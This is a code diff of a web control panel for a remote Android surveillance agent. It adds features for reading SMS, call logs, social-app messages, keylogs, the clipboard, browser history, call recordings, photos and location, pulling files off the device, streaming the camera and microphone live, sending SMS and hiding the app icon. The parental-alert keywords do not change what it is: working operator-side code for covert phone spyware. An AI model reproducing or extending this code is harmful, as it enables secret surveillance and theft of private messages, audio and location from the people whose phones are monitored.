+            row.innerHTML = `<span style="font-size:22px;">${icons[ev.type]||'📋'}</span><div><div style="font-weight:600;">${escapeHtml(ev.name||ev.pkg||ev.extra||ev.type)}</div><div style="font-size:11px;color:#999;">${ev.type}${ev.pkg?'  •  '+ev.pkg:''}  •  ${ev.timeFmt||ev.date||''}</div></div>`;
+            container.appendChild(row);
+        });
+    }
+
+    function showSmsKeywordsPanel() {
+        panel.innerHTML = '<h3>🔑 SMS Keyword Alerts</h3><p>Get alerts when incoming SMS contains any of these words.</p><div><input id="kwInput" placeholder="drug, fight, bully"><button id="saveKw">Save</button></div><div><button id="viewKw">View Current</button><button id="clearKw">Clear All</button><button id="viewAlerts">View Alerts</button></div><div id="kwResult"></div>';
+        document.getElementById('saveKw').onclick = () => {
+            const raw = document.getElementById('kwInput').value.trim();
+            if (!raw) return showNotification('Enter at least one keyword');
+            const kws = raw.split(',').map(k=>k.trim()).filter(k=>k);
+            sendCommand('SET_SMS_KEYWORDS', { keywords: kws });
+        };
+        document.getElementById('viewKw').onclick = () => sendCommand('GET_SMS_KEYWORDS');
+        document.getElementById('clearKw').onclick = () => sendCommand('CLEAR_SMS_KEYWORDS');
+        document.getElementById('viewAlerts').onclick = () => sendCommand('GET_SMS_ALERTS', { days: 5 });
+    }
+
+    function displaySmsKeywords(data) {
+        const div = document.getElementById('kwResult');
+        if (!div) return;
+        div.innerHTML = '';
+        if (!Array.isArray(data) || !data.length) { div.innerHTML = '<p>No keywords set.</p>'; return; }
+        div.innerHTML = `<h4>Active Keywords (${data.length})</h4><div style="display:flex;flex-wrap:wrap;gap:8px;">${data.map(kw=>`<span style="background:#e8f5e9;color:#2e7d32;border:1px solid #a5d6a7;border-radius:16px;padding:4px 12px;">${escapeHtml(kw)}</span>`).join('')}</div>`;
+    }
+
+    function displaySmsAlerts(data) {
+        const div = document.getElementById('kwResult');
+        if (!div) return;
+        div.innerHTML = `<h4>⚠️ Alert History (${Array.isArray(data)?data.length:0})</h4>`;
+        if (!Array.isArray(data) || !data.length) { div.innerHTML += '<p>No alerts triggered yet.</p>'; return; }
+        data.forEach(alert => {
+            div.innerHTML += `<div style="background:#fff8e1;border:1px solid #ffcc02;border-radius:8px;padding:10px;margin-bottom:8px;"><div style="display:flex;justify-content:space-between;"><span style="background:#ff9800;color:#fff;padding:2px 8px;border-radius:10px;">${escapeHtml(alert.keyword)}</span><span style="font-size:11px;">${alert.timeFmt||''}</span></div><div>From: ${escapeHtml(alert.from||'')}</div><div>${escapeHtml(alert.body||alert.message||'')}</div></div>`;
+        });
+    }
+
+    function showSocialMessagesPanel() {
+        panel.innerHTML = '<h3>💬 Social Messages</h3><div><button data-filter="ALL">All</button><button data-filter="com.whatsapp">WhatsApp</button><button data-filter="org.telegram.messenger">Telegram</button><button data-filter="com.instagram.android">Instagram</button></div><div><button data-days="1">Today</button><button data-days="3">3 Days</button><button data-days="5">5 Days</button></div><div id="socialMsgList"></div>';
+        panel.querySelectorAll('button[data-filter]').forEach(btn => btn.onclick = () => filterSocialByPkg(btn.dataset.filter));
+        panel.querySelectorAll('button[data-days]').forEach(btn => btn.onclick = () => sendCommand('GET_SOCIAL_MESSAGES', { days: parseInt(btn.dataset.days) }));
+        sendCommand('GET_SOCIAL_MESSAGES', { days: 1 });
+    }
+
+    function displaySocialMessages(data) {
+        const container = document.getElementById('socialMsgList');
+        if (!container) return;
+        container.innerHTML = '';
+        let messages = data;
+        if (typeof data === 'string') try { messages = JSON.parse(data); } catch(e) { container.innerHTML = '<p>Error parsing messages</p>'; return; }
+        if (!Array.isArray(messages) || !messages.length) { container.innerHTML = '<p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
+        socialMsgsData = messages;
+        renderSocialMessages(messages);
+    }
+
+    let socialMsgsData = [];
+    function renderSocialMessages(data) {
+        const container = document.getElementById('socialMsgList');
+        if (!container) return;
+        container.innerHTML = '';
+        data.slice().reverse().forEach(n => {
+            const card = document.createElement('div');
+            card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:10px;padding:12px;margin-bottom:8px';
+            card.innerHTML = `<div style="display:flex;justify-content:space-between;"><span style="font-weight:700;color:#1976ff;">${escapeHtml(n.app||getAppNameFromPkg(n.pkg)||'Unknown')}</span><span style="color:#aaa;font-size:11px;">${n.timeFmt||''}</span></div><div style="font-weight:600;">${escapeHtml(n.title||'')}</div><div>${escapeHtml(n.text||n.body||'')}</div>`;
+            container.appendChild(card);
+        });
+    }
+    function getAppNameFromPkg(pkg) {
+        const map = { 'com.whatsapp':'WhatsApp', 'org.telegram.messenger':'Telegram', 'com.instagram.android':'Instagram', 'com.facebook.orca':'Messenger', 'com.facebook.katana':'Facebook', 'com.snapchat.android':'Snapchat', 'com.twitter.android':'Twitter', 'com.viber.voip':'Viber', 'com.skype.raider':'Skype' };
+        return map[pkg] || pkg;
+    }
+    function filterSocialByPkg(pkg) {
+        if (!socialMsgsData.length) return;
+        const filtered = pkg === 'ALL' ? socialMsgsData : socialMsgsData.filter(n => n.pkg === pkg || n.packageName === pkg);
+        renderSocialMessages(filtered);
+    }
+
+    function pushLiveNotification(json) {
+        pushAlert('📳 ' + (json.app||'App'), (json.title||'') + ': ' + (json.text||''));
+    }
+
+    function showFirebaseSettingsPanel() {
+        panel.innerHTML = '<h3>🔥 Firebase Configuration</h3><p>Enter your Firebase project config.</p><div id="fbForm"></div><button id="saveFb">Save & Connect</button><div id="fbStatus"></div>';
+        const fields = ['apiKey','authDomain','projectId','storageBucket','messagingSenderId','appId'];
+        const form = document.getElementById('fbForm');
+        fields.forEach(f => {
+            const wrap = document.createElement('div');
+            wrap.innerHTML = `<label>${f}</label><input id="fb_${f}" value="${CONFIG.FIREBASE_CONFIG[f]||''}" placeholder="${f}">`;
+            form.appendChild(wrap);
+        });
+        document.getElementById('saveFb').onclick = () => {
+            const cfg = {};
+            fields.forEach(f => cfg[f] = document.getElementById(`fb_${f}`).value.trim());
+            if (!cfg.projectId) return alert('Enter at least Project ID');
+            localStorage.setItem('fbConfig', JSON.stringify(cfg));
+            alert('Saved! Reload page to apply Firebase config.');
+        };
+        document.getElementById('fbStatus').innerHTML = CONFIG.FIREBASE_CONFIG.apiKey && CONFIG.FIREBASE_CONFIG.apiKey !== 'YOUR_API_KEY' ? '<span style="color:#4caf50;">● Firebase Connected</span>' : '<span style="color:#d32f2f;">● Not configured</span>';
+    }
+
+    function toggleAppIcon() { sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'); }
+    function toggleFlash() { sendCommand(flashOn ? 'FLASH_OFF' : 'FLASH_ON'); }
+
+    // ==================== MESSAGE HANDLERS ====================
+    function handleJSON(json) {
+        console.log('handleJSON:', json.type, json);
+        if (json.type === 'DEVICE_REGISTRATION') console.log('Device registered:', json.deviceId);
+        if (Array.isArray(json)) {
+            if (pendingCommand === 'GET_SMS') { dataType='sms'; currentData=json; renderTable(); }
+            else if (pendingCommand === 'GET_CALL_LOGS') { dataType='call'; currentData=json; renderTable(); }
+            else if (pendingCommand === 'LIST_FILES') { dataType='file'; currentData=json; renderFiles(); }
+            pendingCommand = null;
+            return;
+        }
+        switch(json.type) {
+            case 'SMS_DATA': try { const sms = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; dataType='sms'; currentData=Array.isArray(sms)?sms:[]; renderTable(); } catch(e){console.error(e);} pendingCommand=null; break;
+            case 'CALL_LOGS': try { const call = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; dataType='call'; currentData=Array.isArray(call)?call:[]; renderTable(); } catch(e){} pendingCommand=null; break;
+            case 'FILE_LIST': try { const files = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; dataType='file'; currentData=Array.isArray(files)?files:[]; renderFiles(); } catch(e){} pendingCommand=null; break;
+            case 'FILE_INFO': fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, fileSize: json.fileSize, path: json.path, received:0 }; document.getElementById('progressFileName').innerText = json.fileName; document.getElementById('progressPercent').innerText = '0%'; document.getElementById('progressBar').style.width = '0%'; document.getElementById('downloadProgress').style.display = 'block'; pendingCommand=null; break;
+            case 'FILE_CHUNK': const tr = fileTransfers[json.transferId]; if(!tr) return; setTimeout(()=>{ try{ const bin=atob(json.data); const bytes=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i); tr.chunks[json.chunkIndex]=bytes; tr.received++; const pct=Math.round((tr.received/tr.totalChunks)*100); document.getElementById('progressPercent').innerText=pct+'%'; document.getElementById('progressBar').style.width=pct+'%'; if(tr.received===tr.totalChunks){ const blob=new Blob(tr.chunks); const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.href=url; a.download=tr.fileName; a.click(); URL.revokeObjectURL(url); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; showNotification(`✅ Downloaded: ${tr.fileName}`); } } catch(e){ console.error(e); showNotification('Chunk decode error'); delete fileTransfers[json.transferId]; document.getElementById('downloadProgress').style.display='none'; } },0); pendingCommand=null; break;
+            case 'FILE_TRANSFER_STARTED': showNotification('File transfer started'); pendingCommand=null; break;
+            case 'LOCATION_UPDATE': renderMap(json.data||json); pendingCommand=null; break;
+            case 'CAMERA_IMAGE': displayCapturedImage(json.data); pendingCommand=null; break;
+            case 'AUDIO_RECORDING': showAudio(json.data); pendingCommand=null; break;
+            case 'ERROR': panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${json.error}</div>`; pendingCommand=null; break;
+            case 'DEVICE_STATUS': setStatus(json.status); pendingCommand=null; break;
+            case 'FLASH_ON': flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('🔦 Flashlight ON'); pendingCommand=null; break;
+            case 'FLASH_OFF': flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('🔦 Flashlight OFF'); pendingCommand=null; break;
+            case 'FLASH_TIMED': showNotification('⏱️ Flash timed complete'); pendingCommand=null; break;
+            case 'FLASH_BLINK': showNotification('✨ Flash blink complete'); pendingCommand=null; break;
+            case 'APP_HIDDEN': iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; showNotification('App icon hidden'); pendingCommand=null; break;
+            case 'APP_SHOWN': iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; showNotification('App icon shown'); pendingCommand=null; break;
+            case 'SCREEN_SHARE_STARTED': screenActive=true; document.getElementById('screenBtn').innerText='Stop Screen'; showNotification('Screen share started'); pendingCommand=null; break;
+            case 'SCREEN_SHARE_STOPPED': screenActive=false; document.getElementById('screenBtn').innerText='Start Screen'; if(screenPC){ screenPC.close(); screenPC=null; } showNotification('Screen share stopped'); pendingCommand=null; break;
+            case 'CONTACTS_DATA': try{ const c = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayContacts(c); }catch(e){} pendingCommand=null; break;
+            case 'INSTALLED_APPS': try{ const a = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayInstalledApps(a); }catch(e){} pendingCommand=null; break;
+            case 'APP_USAGE_DATA': try{ const u = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayAppUsage(u); }catch(e){} pendingCommand=null; break;
+            case 'NOTIFICATIONS_DATA': try{ const n = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayNotifications(n); }catch(e){} pendingCommand=null; break;
+            case 'NOTIFICATIONS_CLEARED': showNotification('Notifications cleared'); pendingCommand=null; break;
+            case 'BROWSER_HISTORY_DATA': try{ const h = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayBrowserHistory(h); }catch(e){} pendingCommand=null; break;
+            case 'KEYLOG_DATA': try{ const k = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayKeylog(k); }catch(e){} pendingCommand=null; break;
+            case 'KEYLOG_CLEARED': showNotification('Keylog cleared'); pendingCommand=null; break;
+            case 'CLIPBOARD_DATA': try{ const cl = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayClipboard(cl); }catch(e){ displayClipboard({content:json.data}); } pendingCommand=null; break;
+            case 'WIFI_NETWORKS_DATA': try{ const w = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayWifiNetworks(w); }catch(e){} pendingCommand=null; break;
+            case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); pendingCommand=null; break;
+            case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); pendingCommand=null; break;
+            case 'GEOFENCE_INFO': try{ const gi = json.data; if(gi && gi.active) panel.innerHTML = `<h3>🗺️ Geofence Active</h3><p>📍 ${parseFloat(gi.lat).toFixed(5)}, ${parseFloat(gi.lon).toFixed(5)}</p><p>📏 Radius: ${gi.radius}m</p>`; else panel.innerHTML = '<h3>🗺️ Geofence</h3><p>No active geofence.</p>'; }catch(e){} pendingCommand=null; break;
+            case 'GEOFENCE_ALERT': const gfMsg = json.event==='EXIT'?'🚨 DEVICE LEFT safe zone!':'✅ Device returned to safe zone'; pushAlert('Geofence',gfMsg); showNotification(gfMsg); pendingCommand=null; break;
+            case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); pendingCommand=null; break;
+            case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); pendingCommand=null; break;
+            case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); pendingCommand=null; break;
+            case 'SMS_SENT': showNotification('✅ SMS sent successfully'); pendingCommand=null; break;
+            case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES',{path:currentPath}); pendingCommand=null; break;
+            case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); pendingCommand=null; break;
+            case 'UNINSTALL_INITIATED': showNotification('Uninstall initiated'); pendingCommand=null; break;
+            case 'APP_OPENED': showNotification('App opened'); pendingCommand=null; break;
+            case 'GPS_UPDATES_STOPPED': liveGpsActive=false; const gpsBtn=document.getElementById('liveGpsBtn'); if(gpsBtn){ gpsBtn.querySelector('span:last-child').textContent='Live GPS Track'; gpsBtn.style.cssText=''; } showNotification('GPS tracking stopped'); pendingCommand=null; break;
+            case 'SOCIAL_MESSAGES_DATA': try{ const sm = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displaySocialMessages(sm); }catch(e){} pendingCommand=null; break;
+            case 'NOTIFICATION_LIVE': pushLiveNotification(json); pendingCommand=null; break;
+            case 'CALL_RECORDINGS_DATA': try{ const cr = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayCallRecordings(cr); }catch(e){} pendingCommand=null; break;
+            case 'CALL_AUDIO_DATA': try{ const ca = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; if(ca && ca.audio) playCallRecording(ca); }catch(e){} pendingCommand=null; break;
+            case 'CALL_ALERT': if(json.event==='RINGING') pushAlert('📞 Incoming Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); else if(json.event==='MISSED') pushAlert('📵 Missed Call',(json.name||'Unknown')+' ('+(json.number||'')+')'); else pushAlert('🎙️ Call Recorded',(json.direction||'')+' • '+(json.number||'')+' • '+(json.duration||'')); pendingCommand=null; break;
+            case 'RECENT_IMAGES_DATA': try{ const ri = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayPhotoGallery(ri); }catch(e){} pendingCommand=null; break;
+            case 'IMAGE_DATA': try{ const im = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; if(im && im.image) showFullImage(im.image,im.mediaId); }catch(e){} pendingCommand=null; break;
+            case 'LOCATION_HISTORY_DATA': try{ const lh = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayLocationHistory(lh); }catch(e){} pendingCommand=null; break;
+            case 'APP_EVENTS_DATA': try{ const ae = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displayAppEvents(ae); }catch(e){} pendingCommand=null; break;
+            case 'APP_INSTALLED': pushAlert('📱 App Installed',(json.name||json.pkg)); showNotification('📱 Installed: '+(json.name||json.pkg)); pendingCommand=null; break;
+            case 'APP_REMOVED': pushAlert('🗑️ App Removed',(json.name||json.pkg)); showNotification('🗑️ Removed: '+(json.name||json.pkg)); pendingCommand=null; break;
+            case 'SMS_KEYWORDS_SET': showNotification('✅ Keywords saved'); pendingCommand=null; break;
+            case 'SMS_KEYWORDS_DATA': try{ const kwd = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displaySmsKeywords(kwd); }catch(e){} pendingCommand=null; break;
+            case 'SMS_KEYWORDS_CLEARED': showNotification('Keywords cleared'); pendingCommand=null; break;
+            case 'SMS_ALERTS_DATA': try{ const sa = typeof json.data === 'string' ? JSON.parse(json.data) : json.data; displaySmsAlerts(sa); }catch(e){} pendingCommand=null; break;
+            case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: '+json.keyword,'From '+json.from+': '+json.body); showNotification('🔑 "'+json.keyword+'" from '+json.from); pendingCommand=null; break;
+            case 'HEARTBEAT': break;
+            default: console.log('Unhandled JSON type:', json.type); break;
+        }
+    }
+
+    function handlePlainText(msg) {
+        console.log('Plain text received:', msg);
+        if (msg.startsWith("STATUS:")) { setStatus(msg.substring(7)); pendingCommand=null; }
+        else if (msg.startsWith("LOC_DATA:")) { try { renderMap(JSON.parse(msg.substring(9))); } catch(e){} pendingCommand=null; }
+        else if (msg.startsWith("SMS_DATA:")) { try { currentData = JSON.parse(msg.substring(9)); dataType='sms'; renderTable(); } catch(e){} pendingCommand=null; }
+        else if (msg.startsWith("CALL_DATA:")) { try { currentData = JSON.parse(msg.substring(10)); dataType='call'; renderTable(); } catch(e){} pendingCommand=null; }
+        else if (msg.startsWith("CAMERA_IMAGE:")) { displayCapturedImage(msg.substring(13)); pendingCommand=null; }
+        else if (msg.startsWith("AUDIO_RECORDING:")) { showAudio(msg.substring(16)); pendingCommand=null; }
+        else if (msg.startsWith("FLASH_ON")) { flashOn=true; document.getElementById('flashBtn').innerText='Flash Off'; showNotification('🔦 Flashlight ON'); pendingCommand=null; }
+        else if (msg.startsWith("FLASH_OFF")) { flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('🔦 Flashlight OFF'); pendingCommand=null; }
+        else if (msg.startsWith("FLASH_TIMED")) { showNotification('⏱️ Flash timed complete'); pendingCommand=null; }
+        else if (msg.startsWith("FLASH_BLINK")) { showNotification('✨ Flash blink complete'); pendingCommand=null; }
+        else if (msg.startsWith("VIBRATE_DONE")) { showNotification('Vibration done'); pendingCommand=null; }
+        else if (msg.startsWith("ERROR:")) { panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${msg.substring(6)}</div>`; pendingCommand=null; }
+        else if (msg.startsWith("I_AM_DEVICE")) { console.log('Device identified'); }
+        else if (msg.startsWith('[') || msg.startsWith('{')) { try { handleJSON(JSON.parse(msg)); } catch(e){} }
+        else console.log('Unhandled plain text:', msg);
+    }
+
+    function handleIncomingMessage(msg) {
+        try {
+            const json = JSON.parse(msg);
+            if (json.type === 'SIGNALING') handleSignalingMessage(json.data);
+            else handleJSON(json);
+        } catch(e) { handlePlainText(msg); }
+    }
+
+    // ==================== INITIALIZATION ====================
     function setupEventListeners() {
         document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
-        document.getElementById('clickPictureBtn').addEventListener('click', () => { document.getElementById('clickCameraPanel').classList.toggle('show'); document.getElementById('liveCameraPanel').classList.remove('show'); });
+        document.getElementById('clickPictureBtn').addEventListener('click', () => toggleCameraPanel('click'));
         document.getElementById('capturePictureBtn').addEventListener('click', capturePicture);
-        document.getElementById('liveCameraBtn').addEventListener('click', () => { document.getElementById('liveCameraPanel').classList.toggle('show'); document.getElementById('clickCameraPanel').classList.remove('show'); });
-        document.getElementById('startLiveStreamBtn').addEventListener('click', async () => { const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value; const useFlash = document.getElementById('liveFlashCheckbox').checked; const useMic = document.getElementById('liveMicCheckbox').checked; panel.innerHTML = `<div><video id="liveCamVideo" autoplay playsinline style="width:100%; max-height:500px; background:#000;"></video><div class="live-controls"><button onclick="takeSnapshot()" id="snapshotBtn">📸 Snapshot</button><button onclick="toggleRecording()" id="recordBtn">🔴 Record</button><button class="stop" onclick="stopLiveStream()">⏹ Stop</button></div></div>`; cameraPC = createPeerConnection('camera', (e) => { document.getElementById('liveCamVideo').srcObject = e.streams[0]; }, useMic); const offer = await cameraPC.createOffer(); await cameraPC.setLocalDescription(offer); sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera, flash: useFlash, mic: useMic }); });
-        document.getElementById('liveAudioBtn').addEventListener('click', () => { panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>'; audioPC = createPeerConnection('audio', (e) => { document.getElementById('liveAudio').srcObject = e.streams[0]; }, true); audioPC.createOffer().then(offer => { audioPC.setLocalDescription(offer); sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true }); }); document.getElementById('liveAudioBtn').style.display = 'none'; document.getElementById('stopLiveAudioBtn').style.display = 'block'; });
-        document.getElementById('stopLiveAudioBtn').addEventListener('click', () => { if (audioPC) audioPC.close(); audioPC = null; sendSignalingMessage({ type: 'STOP_AUDIO' }); document.getElementById('liveAudioBtn').style.display = 'block'; document.getElementById('stopLiveAudioBtn').style.display = 'none'; panel.innerHTML = 'Ready.'; });
+        document.getElementById('liveCameraBtn').addEventListener('click', () => toggleCameraPanel('live'));
+        document.getElementById('startLiveStreamBtn').addEventListener('click', startLiveStream);
+        document.getElementById('liveAudioBtn').addEventListener('click', toggleLiveAudio);
+        document.getElementById('stopLiveAudioBtn').addEventListener('click', stopLiveAudio);
         document.getElementById('getLocationBtn').addEventListener('click', () => sendCommand('GET_LOCATION'));
         document.getElementById('fileManagerBtn').addEventListener('click', () => sendCommand('LIST_FILES', { path: 'root' }));
-        document.getElementById('toggleFlashBtn').addEventListener('click', () => sendCommand(flashOn ? 'FLASH_OFF' : 'FLASH_ON'));
-        document.getElementById('flashTimedBtn').addEventListener('click', () => sendCommand('FLASH_TIMED', { duration: 5000 }));
+        document.getElementById('smsInboxBtn').addEventListener('click', () => sendCommand('GET_SMS', { box: 'inbox' }));
+        document.getElementById('smsSentBtn').addEventListener('click', () => sendCommand('GET_SMS', { box: 'sent' }));
+        document.getElementById('callLogsBtn').addEventListener('click', () => sendCommand('GET_CALL_LOGS'));
+        document.getElementById('contactsBtn').addEventListener('click', () => sendCommand('GET_CONTACTS'));
+        document.getElementById('installedAppsBtn').addEventListener('click', () => sendCommand('GET_INSTALLED_APPS'));
+        document.getElementById('browserHistoryBtn').addEventListener('click', () => sendCommand('GET_BROWSER_HISTORY'));
+        document.getElementById('wifiNetworksBtn').addEventListener('click', () => sendCommand('GET_WIFI_NETWORKS'));
+        document.getElementById('screenTimeBtn').addEventListener('click', showAppUsagePanel);
+        document.getElementById('socialMessagesBtn').addEventListener('click', showSocialMessagesPanel);
+        document.getElementById('keylogBtn').addEventListener('click', () => sendCommand('GET_KEYLOG'));
+        document.getElementById('clipboardBtn').addEventListener('click', () => sendCommand('GET_CLIPBOARD'));
+        document.getElementById('geofenceBtn').addEventListener('click', showGeofencePanel);
+        document.getElementById('autoCaptureBtn').addEventListener('click', showSchedulePanel);
+        document.getElementById('liveGpsBtn').addEventListener('click', toggleLiveGps);
+        document.getElementById('locationHistoryBtn').addEventListener('click', showLocationHistoryPanel);
+        document.getElementById('callRecordingsBtn').addEventListener('click', showCallRecordingsPanel);
+        document.getElementById('photoGalleryBtn').addEventListener('click', showPhotoGalleryPanel);
+        document.getElementById('appEventsBtn').addEventListener('click', showAppEventsPanel);
+        document.getElementById('smsKeywordsBtn').addEventListener('click', showSmsKeywordsPanel);
+        document.getElementById('toggleAppIconBtn').addEventListener('click', toggleAppIcon);
+        document.getElementById('lockDeviceBtn').addEventListener('click', () => sendCommand('LOCK_DEVICE'));
+        document.getElementById('sendSmsBtn').addEventListener('click', showSendSmsPanel);
         document.getElementById('vibrateBtn').addEventListener('click', () => sendCommand('VIBRATE', { duration: 1000 }));
+        document.getElementById('toggleFlashBtn').addEventListener('click', toggleFlash);
+        document.getElementById('flashTimedBtn').addEventListener('click', () => sendCommand('FLASH_TIMED', { duration: 5000 }));
         document.getElementById('reconnectBtn').addEventListener('click', manualReconnect);
         document.getElementById('clearAlertsBtn').addEventListener('click', clearAlerts);
         document.getElementById('logoutBtn').addEventListener('click', logout);
-        document.getElementById('sendSmsBtn').addEventListener('click', () => { const num = prompt('Recipient number'); const msg = prompt('Message'); if(num && msg) sendCommand('SEND_SMS', { number: num, message: msg }); });
-        document.getElementById('lockDeviceBtn').addEventListener('click', () => sendCommand('LOCK_DEVICE'));
-        document.getElementById('toggleAppIconBtn').addEventListener('click', () => sendCommand(iconHidden ? 'SHOW_APP' : 'HIDE_APP'));
     }
-    window.takeSnapshot = function() { const video = document.getElementById('liveCamVideo'); if (!video || !video.videoWidth) return alert('No live video'); const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0); canvas.toBlob(blob => { const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.download = `snapshot_${Date.now()}.png`; a.href = url; a.click(); URL.revokeObjectURL(url); }); };
-    window.toggleRecording = function() { const video = document.getElementById('liveCamVideo'); if (!video || !video.srcObject) return; if (mediaRecorder && mediaRecorder.state === 'recording') { mediaRecorder.stop(); document.getElementById('recordBtn').innerText = 'Record Video'; } else { recordedChunks = []; const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d'); const originalStream = video.srcObject; const startRec = () => { canvas.width = video.videoWidth; canvas.height = video.videoHeight; function drawFrame() { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); requestAnimationFrame(drawFrame); } drawFrame(); const canvasStream = canvas.captureStream(30); originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track)); mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' }); mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data); mediaRecorder.onstop = () => { const blob = new Blob(recordedChunks, { type: 'video/webm' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.download = `recording_${Date.now()}.webm`; a.href = url; a.click(); URL.revokeObjectURL(url); canvasStream.getTracks().forEach(track => track.stop()); }; mediaRecorder.start(); document.getElementById('recordBtn').innerText = 'Stop Recording'; }; if (video.videoWidth === 0) video.onloadedmetadata = startRec; else startRec(); } };
-    window.stopLiveStream = function() { if (cameraPC) { cameraPC.close(); cameraPC = null; } sendSignalingMessage({ type: 'STOP_CAMERA' }); panel.innerHTML = 'Ready.'; };
-
-    const menuToggle = document.getElementById('menuToggle'); const sidebar = document.getElementById('sidebar');
-    if (menuToggle) { menuToggle.addEventListener('click', () => { sidebar.classList.toggle('open'); }); document.addEventListener('click', (e) => { if (window.innerWidth <= 768 && sidebar.classList.contains('open') && !sidebar.contains(e.target) && !menuToggle.contains(e.target)) { sidebar.classList.remove('open'); } }); }
 
     renderAuthForm();
     setupEventListeners();
